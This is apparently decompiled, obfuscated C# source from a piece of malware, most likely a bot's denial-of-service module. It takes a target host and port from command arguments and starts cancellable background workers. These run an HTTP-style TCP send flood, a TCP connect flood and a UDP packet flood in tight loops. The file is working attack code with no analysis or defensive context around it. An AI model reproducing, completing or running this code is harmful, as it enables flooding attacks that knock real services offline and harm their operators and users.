using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace ns3;

internal class Class6
{
	private delegate void Delegate0(object sender, DoWorkEventArgs e);

	public static List<BackgroundWorker> list_0 = new List<BackgroundWorker>();

	private static IPEndPoint ipendPoint_0;

	private static Delegate0 delegate0_0;

	private static byte[] byte_0;

	public static bool smethod_0(Class7.Enum0 enum0_0, string[] string_0)
	{
		//IL_00ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b7: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		try
		{
			string text = Convert.ToString(string_0[1]);
			ushort num = ushort.Parse(string_0[2]);
			switch (enum0_0)
			{
			case Class7.Enum0.const_0:
				byte_0 = Encoding.ASCII.GetBytes(string.Format(_003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_38(), Convert.ToString(string_0[3]), text, Environment.NewLine));
				delegate0_0 = smethod_3;
				break;
			case Class7.Enum0.const_1:
				byte_0 = null;
				delegate0_0 = smethod_4;
				break;
			case Class7.Enum0.const_2:
				byte_0 = new byte[Convert.ToInt32(string_0[3])];
				delegate0_0 = smethod_5;
				break;
			}
			try
			{
				ipendPoint_0 = new IPEndPoint(Dns.GetHostEntry(text).get_AddressList()[0], (int)num);
			}
			catch
			{
				ipendPoint_0 = new IPEndPoint(IPAddress.Parse(text), (int)num);
			}
			smethod_1();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void smethod_1()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		BackgroundWorker val = new BackgroundWorker();
		val.add_DoWork(new DoWorkEventHandler(delegate0_0.Invoke));
		val.set_WorkerSupportsCancellation(true);
		val.RunWorkerAsync();
		list_0.Add(val);
	}

	public static void smethod_2()
	{
		if (list_0.Count > 0)
		{
			list_0[0].CancelAsync();
			list_0.RemoveAt(0);
		}
	}

	private static void WR(IAsyncResult iasyncResult_0)
	{
	}

	private static void smethod_3(object sender, DoWorkEventArgs e)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		while (!((BackgroundWorker)((sender is BackgroundWorker) ? sender : null)).get_CancellationPending())
		{
			try
			{
				Socket val = new Socket(((EndPoint)ipendPoint_0).get_AddressFamily(), (SocketType)1, (ProtocolType)6);
				try
				{
					val.Connect((EndPoint)(object)ipendPoint_0);
				}
				catch
				{
					goto end_IL_0003;
				}
				val.set_Blocking(false);
				val.Send(byte_0, (SocketFlags)0);
				goto IL_003e;
				end_IL_0003:;
			}
			catch
			{
				goto IL_003e;
			}
			continue;
			IL_003e:
			Thread.Sleep(15);
		}
	}

	private static void smethod_4(object sender, DoWorkEventArgs e)
	{
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Expected O, but got Unknown
		while (!((BackgroundWorker)((sender is BackgroundWorker) ? sender : null)).get_CancellationPending())
		{
			try
			{
				Socket val = new Socket(((EndPoint)ipendPoint_0).get_AddressFamily(), (SocketType)1, (ProtocolType)6);
				val.BeginConnect((EndPoint)(object)ipendPoint_0, (AsyncCallback)WR, (object)val);
				val.set_Blocking(false);
				val.Close();
			}
			catch
			{
			}
			Thread.Sleep(15);
		}
	}

	private static void smethod_5(object sender, DoWorkEventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Expected O, but got Unknown
		Socket val = new Socket(((EndPoint)ipendPoint_0).get_AddressFamily(), (SocketType)2, (ProtocolType)17);
		val.set_Blocking(false);
		while (!((BackgroundWorker)((sender is BackgroundWorker) ? sender : null)).get_CancellationPending())
		{
			try
			{
				val.SendTo(byte_0, (EndPoint)(object)ipendPoint_0);
			}
			catch
			{
			}
			Thread.Sleep(20);
		}
	}
}
